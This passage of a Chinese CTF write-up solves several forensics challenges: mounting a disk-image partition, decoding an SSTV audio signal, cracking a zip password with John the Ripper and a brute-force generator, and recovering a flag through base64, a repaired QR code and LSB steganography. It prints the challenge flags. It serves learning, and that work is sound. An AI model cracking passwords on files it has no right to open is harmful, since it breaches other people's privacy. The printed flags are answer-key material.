Device         Boot  Start    End Sectors  Size Id Type
disk.flag.img1 *      2048 206847  204800  100M 83 Linux
disk.flag.img2      206848 360447  153600   75M 82 Linux swap / Solaris
disk.flag.img3      360448 614399  253952  124M 83 Linux

Command (m for help): q

```

实践表明，第一个分区里面没有，第二个是交换分区也不太可能，于是直接看第三个分区。

第三个分区的起始位置是 360448（单位是 sectors），然后换算成 byte 就是 184549376。然后就可以用 `mount` 挂载这个分区了：

``` bash
$ sudo mount -o loop,offset=184549376 disk.flag.img /mnt
```

挂载完之后，就可以在 `/mnt` 下面翻文件了。经过一通尝试之后，发现 flag 在 `/root/my_folder/flag.uni.txt` 里面，`cat` 一下即可。

## m00nwalk

听一下音频，有点像 SSTV 的信号。可以用 [RX-SSTV](https://www.qsl.net/on6mu/rxsstv.htm) 接收并解析。

首先先安装一个 [Virtual Audio Cable](https://vac.muzychenko.net/en/download.htm)（Lite 版本就行），用来把 wav 的音频输出重定向回输入，才能被 RX-SSTV 收到。

然后打开 RX-SSTV，再播放 message.wav，RX-SSTV 就会自动的设置好模式开始接收这张图片。

![](m00nwalk_SSTV.png)

接收完之后，就拿到了这张图片：

![](m00nwalk_image.png)

把这张图片倒过来，把里面的 flag 抄下来就行了。

## weak password

### 解压 zip 文件

zip 文件下载下来之后，发现它是有密码的。然后题面写着密码是 “five-byte printable characters”，即 5 位的可打印字符。这里用 John the Ripper 来破解密码。

首先先用 `zip2john` 把 zip 转成 John 能处理的 hash：

``` bash
$ zip2john xxxtentacion.zip > zip.hashes
```

然后需要写一个密码字典生成器，让 John 针对性地破解。

``` python
import string
import itertools

for s in itertools.product(string.printable[:-5], repeat=5):
    print(''.join(s))
```

然后我们就可以用 John 破解了。

下面这句命令的意思是，让 `gen.py` 把字典打印到标准输出，然后重定向到 `john`。然后 `john` 用 `--pipe` 参数让它从标准输入读取密码字典。

```
$ python3 gen.py | john zip.hashes --pipe
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
61f@X            (xxxtentacion.zip/xxxtentacion/xxxtentacion.jpg)
1g 0:00:04:21  0.003828g/s 1874Kp/s 1874Kc/s 1874KC/s 61f;q..61f@!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

~~看了下 CPU 占用，瓶颈居然在 Python 生成字典上。~~

然后就破解出 zip 的密码：`61f@X`。用这个密码解压 zip，就得到了一张 xxxtentacion.jpg 图片。

### 解一层文件隐藏

~~众所周知，jpg 是不能做 LSB 隐写的，因为 jpg 的有损压缩会破坏 LSB。~~

用二进制编辑器打开 xxxtentacion.jpg，然后发现这个文件的后面有一串非常熟悉的编码（其实还是 base64）。

![](Weak_Password_jpg_hidden.png)

把这段内容复制出来，用 base64 解码一下：

![](Weak_Password_base64_decode.png)

这里发现了一个 PNG 的文件头，把它保存下来，后缀名改成 `.png`，就可以得到一张图片：

![](Weak_Password_qrcode_raw.png)

### 二维码

简单观察一下这张图，就发现它非常地“二维码”。根据二维码的格式，这张图应该先反色一下（根据右下角那个定位点），然后再把三个角修好，就得到了一个真正的二维码：

![](Weak_Password_qrcode.png)

扫描一下，得到 `6C75652C20666172206578636565647320796F75722062656C6965667D`。然后用 hex（16 进制）解码一下，得到 `lue, far exceeds your belief}`。

~~经过无厘头猜测，这个应该是 flag 的后半段，那前半段在哪呢？~~

### LSB

我知道你很急，但你先别急。题目里面提到的 LSB 还没用上呢。

用 StegSolve.jar 打开原图，然后左右翻看。然后发现在 Red plane 0 里面（其实 Green 和 Blue 也有，而且是一样的），图片的左边有一串不明信息。

![](Weak_Password_red_plane_0.png)

然后用 Data Extract 功能，选中 Red 的 0，然后直接提取，就得到了 flag 的前半段：

![](Weak_Password_data_extract.png)

把 flag 拼接一下，就有：`ctfshow{Your potential,value, far exceeds your belief}`。再按照题目的要求处理一下，就得到了最终的 flag：`ctfshow{Your_potential_value_far_exceeds_your_belief}`。

## 简单的隐写

用上一题差不多的思路，用 StegSolve.jar 打开，发现 Red plane 1 的地方有一行不明信息。

![](Simple_Forensics.png)

但是并不能直接提取。~~如果直接提取的话，虽然能看到 `ctfshow{`，但是后面的内容不完全对~~。

原因是这幅图用了调色板（palette）。即每一个像素，只记录一个颜色的编号，再用编号去调色板中得到相应的 RGB 颜色。

然后隐写的信息是写在原始数据（即编号）里面的，而不是最终的 RGB 颜色，所以会出现一定的偏差。

不过好在 Python 的 Pillow 库可以直接读取这个原始数据。直接用这个脚本读一下就行：

``` python
from PIL import Image

image = Image.open('mumuzi.png')
pixels = list(image.getdata())  # 获取的是原始数据
binary = [ pixel % 2 for pixel in pixels[:400] ]  # 获取前 400 个像素的 LSB
print(''.join(map(str, binary)))  # 打印
```

然后得到：

```
01100011011101000110011001110011011010000110111101110111011110110011010001100110011001000
01100010011010001100001011001100011000000101101001100110011001001100011011001010010110100
11010000110101001101000011001100101101001110010011010000110010001100000010110100110011011
00110011000110110000100110101001110000110010100110100011000100011000100110101001101100111
11010000000000000000000000000000000000000000
```

然后扔到 CyberChef 解码一下就能拿到 flag。
